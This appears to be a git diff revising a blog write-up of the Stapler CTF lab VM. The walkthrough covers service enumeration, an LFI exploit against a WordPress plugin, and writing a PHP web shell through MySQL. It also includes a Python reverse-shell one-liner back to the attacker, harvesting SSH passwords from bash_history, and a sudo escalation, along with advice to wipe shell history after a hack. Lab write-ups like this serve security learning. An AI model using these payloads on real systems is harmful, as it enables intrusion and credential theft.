@@ -64,7 +64,7 @@ If you already read my previous post, on the [Mr. Robot VM](https://jhalon.githu
 
 As mentioned previously- if you want to learn more about the proper procedures and steps then I suggest you read the [PTES Technical Guidelines](http://www.pentest-standard.org/index.php/Main_Page).
 
-So let's start the process with running `netdiscover` on our network to find the IP of our Attack Target.
+So let's start the process by running `netdiscover` on our network to find the IP of our Target VM.
 
 ```console
  Currently scanning: 192.168.23.0/16   |   Screen View: Unique Hosts           
@@ -78,7 +78,7 @@ So let's start the process with running `netdiscover` on our network to find the
  192.168.1.13    08:00:27:3d:e7:21      1      60  Cadmus Computer Systems 
 ```
 
-The IP of **192.168.1.13** will be our target. WE can now proceed to running an nmap scan to enumerate any open ports, services, versions, and OS's.
+The IP of **192.168.1.13** will be our target. The next step will be to run an nmap scan on our target, so that we can enumerate any open ports, services, versions, and OS's.
 
 ```console
 root@kali:~# nmap -sS -A -O -n -p1-60000 192.168.1.13
@@ -149,9 +149,9 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 151.02 seconds
 ```
 
-We can see that there are a ton of ports open that can be valuable to us: including FTP, NetBIOS (w/ SMB Shares), MySQL, and Port 12380 running a Web Server (Apache HTTPD).
+We can see that there are a ton of valuable (and possibly vulnerable) ports open: including FTP, NetBIOS (w/ SMB Shares), MySQL, and Port 12380 running a Web Server (Apache HTTPD). 
 
-The first thing that caught my eye, was the fact that FTP was allowing anonymous logins. So I made this my first target. Let's go ahead and login to FTP with the username: **anonymous** and the password: **anonymous**.
+The first thing that caught my eye was the fact that FTP was allowing anonymous logins. So I made this my first target. Let's go ahead and login to FTP with the username: **anonymous** and the password: **anonymous**.
 
 ```console
 root@kali:~# ftp 192.168.1.13
@@ -168,6 +168,12 @@ Password:
 230 Login successful.
 Remote system type is UNIX.
 Using binary mode to transfer files.
+ftp> 
+```
+
+Nice! We were able to successfully login to the hosts FTP service as anonymous. At this point, I went ahead to check and see if there aren't any files stored on the FTP server that I can use.
+
+```console
 ftp> ls
 200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
@@ -184,7 +190,7 @@ ftp> exit
 221 Goodbye.
 ```
 
-We can see that after looking though the FTP server we come across a file called **note**. What we did is called the **get** command to download the file back to our host. WE can now open it and see what it contains.
+We can see that after looking though the FTP server, we come across a file called **note**. What I did is call the **get** command to download the file back to our host. From out host, we can open the file and see what it contains.
 
 ```console
 root@kali:~# cat note
@@ -193,7 +199,7 @@ Elly, make sure you update the payload information. Leave it in your FTP account
 
 Nothing too interesting in there - but we do have a name. We can save this name for later uses; such as user enumeration, brute forcing, etc.
 
-After FTP, I followed up with SSH to see if I can log in with root.
+After FTP, I followed up with SSH to see if I can't log in with root - maybe there was a misconfiguration that we could take advantage of.
 
 ```console
 root@kali:~# ssh root@192.168.1.13
@@ -206,7 +212,7 @@ Permission denied, please try again.
 
 This unfortunately didn't provide me with anything - except a name - so I moved on.
 
-My next target focused around TCP port 139, which was an open netbio-ssn. I decided to use `smbclient` to see if I can't enumerate any of the SMB Shares. When prompted for the root password, I just typed in **root**.
+My next target focused around TCP port 139, which was an open [netbios-ssn](https://en.wikipedia.org/wiki/NetBIOS). I decided to use `smbclient` to see if I can't enumerate any of the SMB Shares on the target. When prompted for the root password, I just typed in **root**.
 
 ```console
 root@kali:~# smbclient -L 192.168.1.13
@@ -232,7 +238,7 @@ Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
 WORKGROUP            RED
 ```
 
-The thing that really caught my attention was the comment - **Fred, What are we doing here?**. This led me to believe that Fred had access to kathy's share. So what I attempted to do was to connect to kathy's share, on the networked user/computer fred.
+As we can see, there are 2 active shares - kathy, and tmp. The thing that really caught my attention was the comment - **Fred, What are we doing here?**. This led me to believe that Fred had access to kathy's share. So what I attempted to do was to connect to kathy's share, using the networked user/computer fred.
 
 ```console
 root@kali:~# smbclient //fred/kathy -I 192.168.1.13 -N
@@ -247,7 +253,7 @@ smb: \> ls
 		19478204 blocks of size 1024. 16396996 blocks available
 ```
 
-Nice! Looks like we were able to establish a connection! From here, let's go and enumerate the files and folder on the share. And if we find something we like - we can use the `get` command to download it.
+Nice! Looks like we were able to establish a connection! From here, I began to enumerate the files and folder on the share. For any of the files I found, I went ahead and used the `get` command to download it back to my host, just like in FTP.
 
 ```console
 smb: \> cd kathy_stuff
@@ -300,9 +306,9 @@ getting file \ls of size 274 as ls (13.4 KiloBytes/sec) (average 13.4 KiloBytes/
 smb: \> exit
 ```
 
-Out of the files we got, it seems we got a WordPress Backup, a FTP Configuration file, an LS file, and a to-do-list.
+Out of the files we got, we had a WordPress Backup, a FTP Configuration file, an LS file, and a to-do-list.
 
-Let's open the Note and LS file to see if we can't find anything interesting
+Let's open to-do-list.txt and the ls file to see if we can't find anything interesting.
 
 ```console
 root@kali:~# cat to-do-list.txt
@@ -316,17 +322,15 @@ drwxr-xr-x 16 root root 4.0K Jun  3 22:06 ..
 drwx------  3 root root 4.0K Jun  5 15:32 systemd-private-df2bff9b90164a2eadc490c0b8f76087-systemd-timesyncd.service-vFKoxJ
 ```
 
-From the to-do-list we have another name, and from LS it seems we got a private system file... for now I will skip this as nothing showed up in the Samba Enumeration.
+From the to-do-list we have another name, and from LS it seems we have a directory listing of a time synchronization daemon... for now I will skip this as nothing showed up in the Samba Enumeration, and the information is rather useless.
 
-We will move on and try to access the web server this time. We can navigate to **192.168.1.13:12380** to access the Apache Web Server. Once done so, we will be presented with the following.
+Okay - so we already enumerated a few of the file daemons, and connection based daemons. We will move on and try to access the Apache web server this time. We can navigate to **192.168.1.13:12380** to access the Apache Web Server. Once done, we will be presented with the following.
 
 <a href="/images/stapler1.png"><img src="/images/stapler1.png"></a>
 
-My first choice was to look at the websites source code to see if there aren't any clues left... unfortunately there wasn't. So I decided to fire up and run a nikto scan on the web server to check for any vulnerabilities and misconfigurations.
+My first choice was to look at the websites source code to see if there aren't any clues left... unfortunately there wasn't. So I decided to fire up and run a nikto scan on the web server to check for any vulnerabilities and possible misconfigurations.
 
 ```console
-
-
 root@kali:~# nikto -h 192.168.1.13:12380
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
@@ -363,7 +367,7 @@ root@kali:~# nikto -h 192.168.1.13:12380
 
 Interestingly enough, I got presented with 4 directories: **/phpmyadin/**, **/blogblog/**, **/admin112233/**, and of course **/robots.txt**.
 
-My initial attempts to try and navigate to the directories were futile, as the page kept going back to the home page. So I decided to add **http://** before the IP and try again. I entered the following url **https://192.168.1.13:12380/robots.txt**, and behold - I got the robots.txt page!
+My initial attempts to try and navigate to the directories were futile, as the page kept going back to the home page. So I decided to add **https://** before the IP and try again. I attempted to access **/robots.txt** first, so I entered the following url **https://192.168.1.13:12380/robots.txt** in my browser, and behold - I got the robots.txt page!
 
 ```console
 User-agent: *
@@ -375,11 +379,13 @@ From here, I decided to try and navigate to **/admin112233/** as it seemed the m
 
 <a href="/images/stapler2.png"><img src="/images/stapler2.png"></a>
 
-Damnit! Okay, we all love to play tricks on people - but this nearly gave me a heart attack... Let's try the **/blogblog/** page now.
+Damnit! Okay, some humor is always great - but this nearly gave me a heart attack.... So what did we learn today? DISABLE JAVA!
+
+Once I got over the fact that I could have been hooked, I attempted to navigate the **/blogblog/** page.
 
 <a href="/images/stapler3.png"><img src="/images/stapler3.png"></a>
 
-The blog really didn't contain much information for us - except a few names - as well as the name of the poster. I also saw on the page that there was a "login" section. Navigating to that took me to a WordPress login page... so instead of logging in, why not run WPScan - and let's see if we can't enumerate and users, plugins, and vulnerabilities.
+The blog really didn't contain much information for us - except a few names - as well as the name of the poster (great for future enumeration or brute forcing tactics - if we go that route). I also saw that the page contained a "login" section. Navigating to the login took me to a WordPress login page... so instead of logging in, I decided to run a WPScan and see if I can't enumerate any users, plugins, and vulnerabilities.
 
 ```console
 root@cryptic:~# wpscan --url https://192.168.1.13:12380/blogblog/ --enumerate uap
@@ -654,6 +660,8 @@ _______________________________________________________________
 [+] Elapsed time: 00:00:04
 ```
 
+This is great! Not only did we find a ton of users (which seem to correlate to the names we found earlier) but we also found a few XSS Vulnerabilities, a Path Traversal Vulnerability and a few plugins that we can use to research for possible vulnerable entry points.
+
 After doing some research, I found out that the **advanced-video-embed-embed-videos-or-playlists** was vulnerable to a [LFI](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion) Exploit. Which can be found [here!](https://www.exploit-db.com/exploits/39646/)
 
 Upon downloading the exploit, and running it, I was presented with an SSL error... So I went ahead and edited the code to include the following
@@ -667,7 +675,7 @@ Once it ran successfully - I navigated to **https://192.168.1.13:12380/blogblog/
 
 <a href="/images/stapler5.png"><img src="/images/stapler5.png"></a>
 
-All I did was save the file to my desktop, and removed the .jpeg extension. When we open to review the file we can see the following:
+All I did was save the file to my desktop, and removed the .jpeg extension during the saving process. Once downloaded, I saw that the file was a PHP file. The file contained the following information:
 
 ```php
 // ** MySQL settings - You can get this info from your web host ** //
@@ -790,41 +798,56 @@ mysql> SELECT user_login, user_pass FROM wp_users;
 16 rows in set (0.01 sec)
 ```
 
-Awesome! We got the password hashes of all the users in the blog site. If we wanted to - we could use HashCat to crack the MD5 passwords - but I will leave that out for now, as I don't need a password (since I got root in the MySQL Server).
+Awesome! We got the password hashes for all the WordPress users on the blog site. If we wanted to - we could use HashCat to crack the MD5 passwords - but I will leave that out for now, as I don't need a password (since I got root in the MySQL Server).
 
-Since I am "root" in the MySQL Server, I decided to upload a PHP Shell in the **/wp-content/uplaods/** section as **shell.php**.
+Since I'm already "root" in the MySQL Server, I decided to upload a [PHP Command Shell](http://php.net/manual/en/function.shell-exec.php) in the **/wp-content/uplaods/** section as **shell.php** using MySQL.
+
+I got the idea from [InfoSec Institute](http://resources.infosecinstitute.com/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/) on gaining a reverse shell using SQL Injection.
+
+So what we do is type in the following command in the MySQL command line.
 
 ```console
 mysql> Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
 ```
 
-Once done, we can navigate to **https://192.168.1.13:12380/blogblog/wp-content/uploads/**, and we should see our shell in there.
+Once done, we can navigate to **https://192.168.1.13:12380/blogblog/wp-content/uploads/**, and we should see our php shell in there.
 
 <a href="/images/stapler6.png"><img src="/images/stapler6.png"></a>
 
-Once inside the shell, let's check to see if it works by typing in **?cmd=ifconfig** at the end of the url.
+Once inside the shell, let's check to see if it works by appending **?cmd=ifconfig** to the end of the url. This should give us a dirty output - but will let us know if the shell works properly.
 
 <a href="/images/stapler7.png"><img src="/images/stapler7.png"></a>
 
-Perfect! Since we already have a PHP Shell in place, let's go ahead and set up a Netcat listener on our host, on port 443. This will be used for when we create our reverse shell through the PHP Shell.
+Perfect! Since we already have a PHP Shell in place, and we are able to successfully run arbitrary commands, I decided to try and upload a reverse shell onto the host using python. This would allow us to connect to the target PC and attempt to drop a TTY Shell - possibly leading us to privilege escalation and root privileges.
+
+First thing we have to do is to set up a [netcat](http://nc110.sourceforge.net/) listener on our computer, on port 443. In all honesty, it could be any port of your choosing. But since 443 is usually always open... I just decided to go with that to prevent any unexpected issues later on.
+
+For future reference - if you want to learn more about netcat and its commands, check out this [CheatSheet](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf) by Sans Institute!
 
 ```console
 root@kali:~# nc -lvp 443
 listening on [any] 443 ...
 ```
 
-We will append the following to the end of the URL to initiate a reverse TCP Shell using Python.
+Once we have netcat listening on our target port, we will go ahead and append the following python script to the end of the URL to initiate a reverse TCP Shell.
+
+If we wanted to - we could have used Ruby, or Bash to carry out the reverse tcp shell. But since I really like python and its versatility, I just stuck with it. You can read more on reverse tcp shells from the [PenTest Monekey Reverse Shell CheatSheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
 
 ```console
 python%20-c%20'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.7",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-If done correctly, we should not have an established session between our host PC, and the target.
+If done correctly, we should now have an established session between our host PC, and the target.
 
 ```console
 192.168.1.13: inverse host lookup failed: Unknown host
 connect to [192.168.1.7] from (UNKNOWN) [192.168.1.13] 52716
 /bin/sh: 0: can't access tty; job control turned off
+```
+
+Now the next step is to set up a TTY Shell on the target pc so that we can carry out commands. Again I used Python to spawn a bash shell.
+
+```console
 $ python -c 'import pty;pty.spawn("/bin/bash")'
 www-data@red:/var/www/https/blogblog/wp-content/uploads$ 
 www-data@red:/var/www/https/blogblog/wp-content/uploads$ cd /
@@ -836,7 +859,7 @@ boot  home	      lost+found  opt	run   srv   usr
 dev   initrd.img.old  media	  proc	sbin  sys   var
 ```
 
-From this point, I created a small Bash script that will list all the bash_history's.
+From this point, I created a small Bash script to list the [bash_history](http://www.symkat.com/understanding-bash-history) on the target. This was used to enumerate any commands left behind by the user.
 
 ```console
 www-data@red:/home$ find -name ".bash_history" -exec cat {} \;
@@ -862,7 +885,9 @@ whoami
 www-data@red:/home$ 
 ```
 
-When we look closely, we can see that there are 2 user names and passwords. The one I see come up the most is **peter**, and we also see his ssh password! So let's open up another console, and try to SSH into our target machine with peter's name and password.
+When we look closely, we can see that there are 2 user names and passwords. The one I see come up the most is **peter**, and we also see his ssh password! So my fellow hackers - this goes out to all of you... ALWAYS and I mean ALWAYS remember to wipe your bash_history after a hack! 
+
+So let's open up another console, and try to SSH into our target machine with peter's name and password.
 
 ```console
 root@kali:~# ssh peter@192.168.1.13
@@ -890,7 +915,7 @@ User peter may run the following commands on red:
     (ALL : ALL) ALL
 ```
 
-From here, I learned that Peter has root privilege in the sudoers file. Thus, I went and changed my shell from Z to bash, and went to capturing the flag!
+From this point, I noticed that Peter has root privilege from the sudoers file! This makes my life easier! Thus, I went and changed my shell from Z to bash, and went to capturing the flag from the **/root** directory!
 
 ```console
 red% sudo usermod -s /bin/bash peter
@@ -916,4 +941,14 @@ b6b545dc11b7a270f4bad23432190c75162c4a2b
 
 ## Closing:
 
-~ TO BE ADDED~
+Awesome! We pwnd the stapler and got root! - Sorry Milton!
+
+<a href="http://i.imgur.com/YTEVMeh.gif"></a>
+
+In my honest opinion, this VM was a tough one to beat! It took me a while and a whole lot of research before figuring out how to attack the target.
+
+After doing the Stapler and Mr. Robot VM, I seriously learned a lot on the different attack methods, scan options (which prevented me from finding the vulnerability), enumeration, and note taking in general. I found out that when tackling a system like this - it's always good to keep a set of notes of all the scans, as it made it easier for me to connect the dots.
+
+Overall, this was great system and I want to thank g0tmi1k, nullmode, rasta_mouse & superkojiman for putting this together!
+
+Thank you all for reading, and stay tuned for more CTF's, Write-ups, Projects, and more!
